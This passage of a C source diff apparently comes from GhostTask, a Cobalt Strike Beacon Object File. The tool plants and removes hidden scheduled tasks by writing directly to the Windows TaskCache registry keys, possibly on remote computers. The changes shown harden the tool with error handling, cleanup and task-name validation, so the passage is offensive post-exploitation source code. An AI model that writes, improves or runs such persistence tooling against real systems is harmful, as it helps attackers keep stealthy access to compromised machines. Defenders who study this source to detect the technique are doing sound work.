         if (scheduleType == 3)
-            AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger12) + sizeof(LogonTrigger), (LPBYTE)trigger12, true);
+        {
+            if (!AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger12) + sizeof(LogonTrigger), (LPBYTE)trigger12, true))
+                goto exit;
+        }
         else
-            AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger12) + sizeof(TimeTrigger), (LPBYTE)trigger12, true);
+        {
+            if (!AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger12) + sizeof(TimeTrigger), (LPBYTE)trigger12, true))
+                goto exit;
+        }
     }
     else
     {
         if (scheduleType == 3)
-            AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger28) + sizeof(LogonTrigger), (LPBYTE)trigger28, true);
+        {
+            if (!AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger28) + sizeof(LogonTrigger), (LPBYTE)trigger28, true))
+                goto exit;
+        }
         else
-            AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger28) + sizeof(TimeTrigger), (LPBYTE)trigger28, true);
+        {
+            if (!AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger28) + sizeof(TimeTrigger), (LPBYTE)trigger28, true))
+                goto exit;
+        }
     }
 
+    success = TRUE;
     BeaconPrintf(CALLBACK_OUTPUT, "Scheduled task has been created with the following setup:");
     if (computerName != NULL)
         BeaconPrintf(CALLBACK_OUTPUT, "%-30s %s", "Target Computer Name:", computerName);
@@ -1190,10 +1565,13 @@ void AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR ar
     else
         BeaconPrintf(CALLBACK_OUTPUT, "%-30s GhostTask.exe %s delete \"%s\"", "Task Deletion Command:", computerName, taskName);
 
-    // Close key
-    RegCloseKey(hKeyTree);
-    RegCloseKey(hKeyTask);
 exit:
+    if (hKeyTree != NULL)
+        RegCloseKey(hKeyTree);
+    if (hKeyTask != NULL)
+        RegCloseKey(hKeyTask);
+    if (pSd != NULL)
+        KERNEL32$LocalFree(pSd);
     free(actionRaw);
     free(action);
     free(uriPath);
@@ -1201,8 +1579,12 @@ exit:
     free(plainKey);
     free(taskKey);
     free(fullGuid);
+    free(productName);
+    free(targetSid);
+    free(domainName);
     free(trigger12);
     free(trigger28);
+    return success;
 }
 
 /* ---------------------------------------------------------------------------Add func end--------------------------------------------------------------------------------------------------------------------------------*/
@@ -1256,37 +1638,49 @@ REG_ERROR_CODE DeleteKey(LPCSTR computerName, LPCSTR keyName)
     return REG_SUCCESS;
 }
 
-void DeleteScheduleTask(LPCSTR computerName, LPCSTR taskName)
+BOOL DeleteScheduleTask(LPCSTR computerName, LPCSTR taskName)
 {
     char *plain = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Plain\\";
     char *task = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\";
     char *tree = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\";
     char treeKey[MAX_PATH];
     char *fullGuid = NULL;
-    HKEY hKeyTree = NULL;
+    BOOL success = FALSE;
+
+    if (!GhostTaskHasSafeTaskName(taskName))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Task name must be a safe 1-190 byte registry path.");
+        return FALSE;
+    }
 
     sprintf(treeKey, "%s%s", tree, taskName);
-    REG_ERROR_CODE regRetCode = OpenKeyHandle(&hKeyTree, computerName, KEY_QUERY_VALUE, treeKey);
-    if (regRetCode == SERVER_INACCESSIBLE)
-        return;
-    if (regRetCode == OPEN_KEY_FAIL)
+    TASK_GUID_RESULT guidResult = GetExistingTaskGuid(computerName, taskName, &fullGuid);
+    if (guidResult == TaskGuidAbsent)
     {
         BeaconPrintf(CALLBACK_ERROR, "The scheduled task does not exist.");
-        return;
+        goto delete_exit;
     }
-    RegCloseKey(hKeyTree);
-    fullGuid = GetExistingTaskGuid(computerName, taskName);
-    regRetCode = DeleteKey(computerName, treeKey);
-    if (fullGuid != NULL)
+    if (guidResult != TaskGuidFound || fullGuid == NULL)
     {
-        char plainKey[MAX_PATH];
-        char taskKey[MAX_PATH];
-        sprintf(plainKey, "%s%s", plain, fullGuid);
-        sprintf(taskKey, "%s%s", task, fullGuid);
-        regRetCode = DeleteKey(computerName, plainKey);
-        regRetCode = DeleteKey(computerName, taskKey);
+        BeaconPrintf(CALLBACK_ERROR, "Existing task metadata is inaccessible or malformed; refusing partial deletion.");
+        goto delete_exit;
     }
+
+    char plainKey[MAX_PATH];
+    char taskKey[MAX_PATH];
+    sprintf(plainKey, "%s%s", plain, fullGuid);
+    sprintf(taskKey, "%s%s", task, fullGuid);
+    if (DeleteKey(computerName, treeKey) != REG_SUCCESS ||
+        DeleteKey(computerName, plainKey) != REG_SUCCESS ||
+        DeleteKey(computerName, taskKey) != REG_SUCCESS)
+        goto delete_exit;
+
+    success = TRUE;
     BeaconPrintf(CALLBACK_OUTPUT, "Successfully deleted scheduled task (%s).\n", taskName);
+
+delete_exit:
+    free(fullGuid);
+    return success;
 }
 
 /* ---------------------------------------------------------------------------Del func end--------------------------------------------------------------------------------------------------------------------------------*/
